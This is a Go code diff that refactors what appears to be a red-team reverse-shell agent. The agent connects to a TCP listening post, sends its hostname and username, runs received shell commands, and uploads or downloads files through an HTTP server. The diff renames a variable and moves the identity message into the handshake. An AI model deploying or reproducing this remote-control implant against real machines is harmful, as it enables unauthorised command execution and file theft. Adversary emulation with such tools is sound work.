@@ -13,7 +13,7 @@ import (
    "./commands"
 )
 
-var paw, httpServer string
+var shellInfo, httpServer string
 
 func runNextCommand(message string) []byte {
    if strings.HasPrefix(message, "cd") {
@@ -26,7 +26,7 @@ func runNextCommand(message string) []byte {
       return []byte("Download initiated\n")
    } else if (strings.HasPrefix(message, "upload")) {
       pieces := strings.Split(message, "upload")
-      go commands.Upload(httpServer, pieces[1], paw)
+      go commands.Upload(httpServer, pieces[1], shellInfo)
       return []byte("Upload initiated\n")
    } else {
       bites := commands.Execute(message)
@@ -46,13 +46,15 @@ func listen(conn net.Conn) {
 func handshake(conn net.Conn) bool{
     conn.Write([]byte(terminal_key))
     conn.Write([]byte("\n"))
+    conn.Write([]byte(shellInfo))
+    conn.Write([]byte("\n"))
     return true
 }
 
 func main() {
    host, _ := os.Hostname()
    user, _ := user.Current()
-   paw = fmt.Sprintf("%s$%s", host, user.Username)
+   shellInfo = fmt.Sprintf("%s$%s", host, user.Username)
 
    tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
    http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
@@ -65,7 +67,6 @@ func main() {
          fmt.Println(err)
       } else {
           handshake(conn)
-          conn.Write([]byte(paw))
           listen(conn)
       }
       time.Sleep(5 * time.Second)
